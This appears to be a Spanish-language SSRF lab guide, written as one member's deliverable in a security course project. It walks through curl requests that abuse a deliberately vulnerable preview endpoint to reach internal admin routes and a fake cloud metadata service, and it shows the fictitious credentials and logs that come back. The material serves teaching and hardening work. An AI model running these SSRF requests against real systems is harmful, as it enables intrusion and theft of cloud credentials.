# Guía de explotación SSRF — Persona 3

**Entorno:** `docker compose up --build` (desde `lab-environment/`)
**Endpoint vulnerable:** `GET /preview?url=<URL>` en `frontend-service` (puerto publicado `8080`, CWE-918)
**Objetivos internos:** `internal-admin-service` (`internal-net`, puerto 5001) y `fake-metadata` (`internal-net`, puerto 80)

> Todas las credenciales que aparecen abajo son ficticias (ver `internal-admin-service/app.py` y `fake-metadata/app.py`). Entorno 100% aislado, sin salida a Internet (`internal-net: internal: true`).

---

## Fase 0 — Verificación previa

```bash
curl -s http://localhost:8080/health          # frontend: debe responder {"status":"ok"}
curl -s http://localhost:5001/health          # debe FALLAR (puerto interno no publicado al host)
curl -s http://localhost:80/health            # debe FALLAR (puerto interno no publicado al host)
```

Esto confirma que, desde fuera, solo `frontend-service` es alcanzable. El resto del ataque demuestra cómo `frontend-service` se usa como **pivote** para saltar esa barrera.

## Fase 1 — Reconocimiento

```bash
curl -s http://localhost:8080/                              # descubre el endpoint /preview
curl -s "http://localhost:8080/preview?url=http://example.org"   # comportamiento normal: hace de proxy
```

`frontend-service` toma el parámetro `url` y hace `requests.get(url)` **sin validar el destino** (ver comentario `# VULNERABLE A PROPÓSITO` en el código). Esto significa que cualquier URL —incluida una que apunte a `internal-net`— será solicitada por el propio contenedor, que sí tiene pie en esa red.

## Fase 2 — Explotación contra `internal-admin-service`

```bash
# 2.1 Confirmar alcance a la red interna
curl -s "http://localhost:8080/preview?url=http://internal-admin-service:5001/health"

# 2.2 Enumerar usuarios administrativos (CONFIDENCIALIDAD comprometida)
curl -s "http://localhost:8080/preview?url=http://internal-admin-service:5001/admin/users"

# 2.3 Exfiltrar configuración con credenciales (db_password, api_key)
curl -s "http://localhost:8080/preview?url=http://internal-admin-service:5001/admin/config"
```

## Fase 3 — Explotación contra `fake-metadata` (simula 169.254.169.254)

```bash
# 3.1 Enumerar el rol IAM asociado a la instancia
curl -s "http://localhost:8080/preview?url=http://fake-metadata/latest/meta-data/iam/security-credentials/"

# 3.2 Robar las credenciales temporales del rol (impacto máximo: toma del control de la "nube")
curl -s "http://localhost:8080/preview?url=http://fake-metadata/latest/meta-data/iam/security-credentials/lab-ec2-role"
```

---

## Evidencia capturada (reproducción validada contra el código real del repo)

> Nota de metodología: este contenedor de trabajo no tiene Docker disponible, así que la cadena de comandos se validó corriendo los tres `app.py` tal cual están en `lab-environment/` de forma local (mismos endpoints y lógica, puertos de loopback en vez de `internal-net`). Para el entregable final, re-ejecuta exactamente los comandos de arriba contra `docker compose up --build` y reemplaza esta evidencia por tus propias capturas de pantalla.

**Respuesta a 2.2 (usuarios):**
```json
{"users":[{"id":1,"role":"superadmin","user":"admin"},{"id":2,"role":"finance","user":"maria.lopez"},{"id":3,"role":"support","user":"jperez"}]}
```

**Respuesta a 2.3 (config con credenciales):**
```json
{"api_key":"FAKE-INTERNAL-API-KEY","db_host":"db.internal.lab","db_password":"FAKE-PASSWORD-123"}
```

**Respuesta a 3.2 (credenciales temporales robadas):**
```json
{"AccessKeyId":"AKIAFAKEFAKEFAKEFAKE","Code":"Success","Expiration":"2099-12-31T23:59:59Z","SecretAccessKey":"FAKE/secret/access/key/for/lab/only","Token":"FAKE-SESSION-TOKEN-LAB-ONLY","Type":"AWS-HMAC"}
```

**Logs del lado servidor (`internal-admin-service`) — evidencia de acceso no autorizado:**
```
[internal-admin] GET /admin/users desde 127.0.0.1
[internal-admin] GET /admin/config desde 127.0.0.1
```
> En el entorno Docker real, `remote_addr` mostrará la IP de `frontend-service` (`172.28.0.10`), no la del atacante — eso es justamente la evidencia de que el servicio interno nunca ve al atacante real, solo confía ciegamente en quien le hable desde `internal-net`.

**Logs del lado servidor (`fake-metadata`):**
```
[fake-metadata] GET /latest/meta-data/iam/security-credentials/ desde 127.0.0.1
[fake-metadata] GET /latest/meta-data/iam/security-credentials/lab-ec2-role desde 127.0.0.1
```

---

## Análisis de impacto

| Propiedad comprometida | Cómo | Evidencia |
|---|---|---|
| **Confidencialidad** (datos internos) | Lectura de `/admin/users` sin autenticación | Fase 2.2 |
| **Confidencialidad** (secretos) | Exfiltración de `db_password` y `api_key` | Fase 2.3 |
| **Confidencialidad + escalamiento** | Robo de credenciales temporales de "nube" (IAM) | Fase 3.2 |
| **Control de acceso / segmentación de red** | `internal-net` debía ser inalcanzable desde fuera; se alcanzó usando `frontend-service` como proxy involuntario | Fase 0 vs. Fase 2–3 |

**Cadena de ataque:** parámetro de usuario sin validar → petición saliente del servidor hacia un destino arbitrario → abuso de la confianza implícita servicio-a-servicio dentro de `internal-net` → lectura de datos administrativos y credenciales de nube simuladas → con credenciales reales, esto escalaría a compromiso total de la cuenta de nube (ver CVE-2025-53767 citado en la fundamentación de P2).

Esto es exactamente el "punto ciego" que documentó P2: `internal-admin-service` y `fake-metadata` no exigen autenticación a quien les hable desde `internal-net`, porque se asume que solo hablan ahí servicios confiables. `frontend-service` rompe ese supuesto.

**Para P4:** el script `exploit-ssrf.sh` (carpeta `attack-guide/`) debe fallar en las fases 2 y 3 una vez aplicado el hardening (allowlist + segmentación + mTLS). La fase 0 y el `/preview?url=http://example.org` legítimo deben seguir funcionando.
